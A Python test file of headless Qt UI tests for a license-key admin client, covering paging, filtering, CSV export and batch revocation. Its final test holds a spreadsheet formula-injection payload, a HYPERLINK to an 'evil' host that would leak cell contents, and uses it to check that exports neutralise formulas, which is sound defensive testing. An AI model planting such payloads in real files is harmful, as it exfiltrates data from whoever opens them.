"""UI regression tests for the client pages (headless Qt)."""

import csv
import os

import pytest

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

pytest.importorskip("PySide6")

from PySide6.QtCore import QItemSelectionModel  # noqa: E402
from PySide6.QtWidgets import QApplication, QFileDialog, QSplitter  # noqa: E402

from core import pages as pages_module  # noqa: E402
from core.api_client import ApiError  # noqa: E402
from core.pages import (  # noqa: E402
    BatchesPage,
    GeneratePage,
    LicensesPage,
    LogsPage,
    OfflinePage,
    write_csv_file,
)


@pytest.fixture(scope="module")
def qt_app():
    app = QApplication.instance() or QApplication([])
    yield app


def notify(*_args, **_kwargs) -> None:
    return None


def make_item(index: int, status: str = "unused", batch: str = "B1") -> dict:
    return {
        "key_code": f"LIC-{index:04d}",
        "edition": "standard",
        "status": status,
        "duration_days": 30,
        "duration_unit": "day",
        "max_devices": 2,
        "machine_codes": [f"MC{index}"] if status == "active" else [],
        "created_at": "2026-10-01 10:00:00",
        "expires_at": None,
        "batch_no": batch,
        "note": f"客户{index}",
    }


class FakeClient:
    def __init__(self, count: int = 120):
        self.items = [make_item(i, batch="B1" if i % 2 == 0 else "B2") for i in range(count)]
        self.logs = [
            {
                "created_at": "2026-10-01 10:00:00",
                "action": "生成密钥",
                "actor": "admin",
                "target": "B1",
                "detail": "共 10 个",
                "ip": "",
            },
            {
                "created_at": "2026-10-01 10:01:00",
                "action": "吊销密钥",
                "actor": "admin",
                "target": "LIC-0001",
                "detail": "",
                "ip": "",
            },
        ]
        self.calls: list[dict] = []
        self.revoked: list[str] = []
        self.restored: list[str] = []

    def list_licenses(self, **params):
        self.calls.append(params)
        keyword = (params.get("keyword") or "").lower()
        status = params.get("status") or ""
        batch_no = params.get("batch_no") or ""
        limit = int(params.get("limit") or 100)
        offset = int(params.get("offset") or 0)
        rows = []
        for item in self.items:
            blob = " ".join(str(value) for value in item.values()).lower()
            if keyword and keyword not in blob:
                continue
            if status and item["status"] != status:
                continue
            if batch_no and item["batch_no"] != batch_no:
                continue
            rows.append(item)
        return {"items": rows[offset:offset + limit], "total": len(rows)}

    def list_logs(self, limit: int = 200, keyword: str = "", action: str = "", offset: int = 0):
        # Mirrors GET /api/logs: server-side keyword/action filters, offset
        # paging and a real total, so the page is exercised against the
        # contract it actually talks to.
        rows = self.logs
        if keyword:
            needle = keyword.lower()
            rows = [
                row
                for row in rows
                if needle in " ".join(str(v) for v in row.values()).lower()
            ]
        if action:
            rows = [row for row in rows if row.get("action") == action]
        window = rows[offset:offset + limit]
        return {"items": window, "total": len(rows)}

    def list_batches(self, **params):
        keyword = (params.get("keyword") or "").lower()
        counts: dict[str, int] = {}
        for item in self.items:
            batch_no = item["batch_no"]
            counts[batch_no] = counts.get(batch_no, 0) + 1
        rows = [
            {"batch_no": batch_no, "total": total, "note": ""}
            for batch_no, total in sorted(counts.items())
            if not keyword or keyword in batch_no.lower()
        ]
        limit = int(params.get("limit") or 200)
        return {"items": rows[:limit], "total": len(rows)}

    def revoke_batch(self, batch_no: str):
        self.revoked.append(batch_no)
        return {"count": 3}

    def restore_batch(self, batch_no: str):
        self.restored.append(batch_no)
        return {"count": 3}

    def revoke_license(self, key_code: str):
        if key_code.endswith("0003"):
            raise ApiError("状态不允许")
        return {"ok": True}


def test_splitter_handles_stay_thin(qt_app):
    client = FakeClient(1)
    for factory in (GeneratePage, OfflinePage):
        page = factory(client, notify)
        splitters = page.findChildren(QSplitter)
        assert splitters, f"{factory.__name__} 应使用 QSplitter 布局"
        for splitter in splitters:
            assert splitter.handleWidth() <= 8


def test_licenses_page_paging_and_filters(qt_app):
    client = FakeClient(120)
    page = LicensesPage(client, notify)
    page.refresh()
    assert page.table.rowCount() == 100
    assert page.total_label.text() == "共 120 条"
    assert page.page_label.text() == "第 1 / 2 页"
    assert page.next_button.isEnabled()
    assert not page.prev_button.isEnabled()

    page.go_page(1)
    assert client.calls[-1]["offset"] == 100
    assert page.table.rowCount() == 20
    assert not page.next_button.isEnabled()

    page.go_page(-1)
    assert client.calls[-1]["offset"] == 0

    page.keyword.setText("LIC-0002")
    page.apply_filters()
    assert page.table.rowCount() == 1
    assert client.calls[-1]["offset"] == 0

    page.reset_filters()
    assert page.keyword.text() == ""
    page._sync_batches()
    index = page.batch.findData("B1")
    assert index >= 0
    page.batch.setCurrentIndex(index)
    assert page.table.rowCount() == 60
    assert client.calls[-1]["batch_no"] == "B1"


def test_licenses_page_multiselect_copy_and_export(qt_app, tmp_path, monkeypatch):
    client = FakeClient(20)
    page = LicensesPage(client, notify)
    page.refresh()
    model = page.table.model()
    selection = page.table.selectionModel()
    selection.select(model.index(0, 0), QItemSelectionModel.Select | QItemSelectionModel.Rows)
    selection.select(model.index(1, 0), QItemSelectionModel.Select | QItemSelectionModel.Rows)

    page.copy_selected()
    copied = QApplication.clipboard().text().splitlines()
    assert len(copied) == 2

    target = tmp_path / "licenses.csv"
    monkeypatch.setattr(
        QFileDialog, "getSaveFileName", staticmethod(lambda *a, **k: (str(target), "CSV 文件 (*.csv)"))
    )
    page.export_selected()
    lines = target.read_text(encoding="utf-8-sig").splitlines()
    assert len(lines) == 3
    assert "密钥" in lines[0]


def test_licenses_batch_action_reports_failures(qt_app, monkeypatch):
    client = FakeClient(12)
    page = LicensesPage(client, notify)
    page.refresh()
    page.table.selectAll()
    messages: list[tuple[str, str]] = []
    page.notify = lambda message, kind="info": messages.append((kind, message))
    monkeypatch.setattr(pages_module, "confirm", lambda *a, **k: True)
    monkeypatch.setattr(pages_module, "info", lambda *a, **k: None)
    page.revoke_selected()
    assert any(kind == "warning" for kind, _ in messages), messages


def test_logs_page_filter_and_export(qt_app, tmp_path, monkeypatch):
    client = FakeClient(4)
    page = LogsPage(client, notify)
    page.refresh()
    assert page.table.rowCount() == 2
    assert [page.action.itemData(i) for i in range(page.action.count())] == ["", "生成密钥", "吊销密钥"]

    page.keyword.setText("吊销")
    assert page.table.rowCount() == 1
    assert page.count_label.text() == "显示 1 / 共 2 条"

    page.keyword.clear()
    page.action.setCurrentIndex(page.action.findData("生成密钥"))
    assert page.table.rowCount() == 1

    page.action.setCurrentIndex(0)
    target = tmp_path / "logs.csv"
    monkeypatch.setattr(
        QFileDialog, "getSaveFileName", staticmethod(lambda *a, **k: (str(target), "CSV 文件 (*.csv)"))
    )
    page.export_rows()
    assert target.exists()


def test_generate_page_exposes_all_card_types_and_gsq_prefix(qt_app):
    page = GeneratePage(FakeClient(0), notify)
    units = [page.unit.itemData(index) for index in range(page.unit.count())]
    assert units == [
        "minute",
        "hour",
        "day",
        "week",
        "month",
        "quarter",
        "year",
    ]
    labels = [page.unit.itemText(index) for index in range(page.unit.count())]
    assert labels[-4:] == ["星期卡", "月卡", "季卡", "年卡"]
    assert page.prefix.text() == "GSQ"
    page.unit.setCurrentIndex(units.index("year"))
    assert page.duration.suffix() == " 年"
    assert page.duration.maximum() == 100


def test_generate_page_tracks_batch_and_exports_csv(qt_app, tmp_path, monkeypatch):
    class GenerateClient(FakeClient):
        def generate_licenses(self, **payload):
            count = payload.get("count", 1)
            return {
                "batch_no": "BATCH-9",
                "count": count,
                "keys": [f"LIC-{i:04d}" for i in range(count)],
            }

    page = GeneratePage(GenerateClient(0), notify)
    page.count.setValue(3)
    page.note.setText("测试备注")
    page.generate()
    assert len(page.output.toPlainText().splitlines()) == 3
    assert page.last_meta["batch_no"] == "BATCH-9"

    target = tmp_path / "keys.csv"
    monkeypatch.setattr(
        QFileDialog, "getSaveFileName", staticmethod(lambda *a, **k: (str(target), "CSV 文件 (*.csv)"))
    )
    page.export_keys()
    lines = target.read_text(encoding="utf-8-sig").splitlines()
    assert len(lines) == 4
    assert "BATCH-9" in lines[1]

    page.reset_form()
    assert page.count.value() == 1
    assert page.note.text() == ""


def test_batches_page_listing_export_and_revoke(qt_app, tmp_path, monkeypatch):
    client = FakeClient(8)
    page = BatchesPage(client, notify)
    page.refresh()
    assert page.table.rowCount() == 2
    assert page.total_label.text() == "共 2 个批次"
    batch_no = page.table.item(0, 0).text()
    assert batch_no in {"B1", "B2"}

    page.table.selectRow(0)
    page.copy_batch()
    assert QApplication.clipboard().text().strip() == batch_no

    target = tmp_path / "batch_keys.csv"
    monkeypatch.setattr(
        QFileDialog, "getSaveFileName",
        staticmethod(lambda *a, **k: (str(target), "CSV 文件 (*.csv)")),
    )
    page.export_batch_keys()
    lines = target.read_text(encoding="utf-8-sig").splitlines()
    assert len(lines) == 5  # 表头 + 4 条密钥
    assert "密钥" in lines[0]
    assert batch_no in lines[1]

    messages: list[tuple[str, str]] = []
    page.notify = lambda message, kind="info": messages.append((kind, message))
    monkeypatch.setattr(pages_module, "confirm", lambda *a, **k: True)
    page.revoke_batch()
    assert client.revoked == [batch_no]
    assert any(kind == "success" for kind, _ in messages), messages


def test_batches_page_restore_batch(qt_app, monkeypatch):
    client = FakeClient(4)
    page = BatchesPage(client, notify)
    page.refresh()
    page.table.selectRow(0)
    batch_no = page.table.item(0, 0).text()

    messages: list[tuple[str, str]] = []
    page.notify = lambda message, kind="info": messages.append((kind, message))
    monkeypatch.setattr(pages_module, "confirm", lambda *a, **k: True)
    page.restore_batch()

    assert client.restored == [batch_no]
    assert any(kind == "success" for kind, _ in messages), messages


def test_write_csv_file_uses_bom_and_headers(tmp_path):
    target = tmp_path / "plain.csv"
    write_csv_file(str(target), ["密钥", "备注"], [["LIC-1", "含,逗号"]])
    raw = target.read_bytes()
    assert raw.startswith(b"\xef\xbb\xbf")
    text = target.read_text(encoding="utf-8-sig")
    assert "密钥,备注" in text
    assert '"含,逗号"' in text


def test_write_csv_file_neutralises_formula_cells(tmp_path):
    # A failed-login username is stored verbatim in the audit log, so the
    # export is the place that has to stop it becoming a formula.
    target = tmp_path / "audit.csv"
    write_csv_file(
        str(target),
        ["对象", "详情"],
        [
            ['=HYPERLINK("http://evil/?d="&A1,"click")', "-12"],
            ["+1", "正常文本"],
        ],
    )
    with target.open(encoding="utf-8-sig", newline="") as handle:
        rows = list(csv.reader(handle))
    assert rows[1][0].startswith("'=")
    assert rows[1][1] == "-12"
    assert rows[2][0] == "+1"
    assert rows[2][1] == "正常文本"
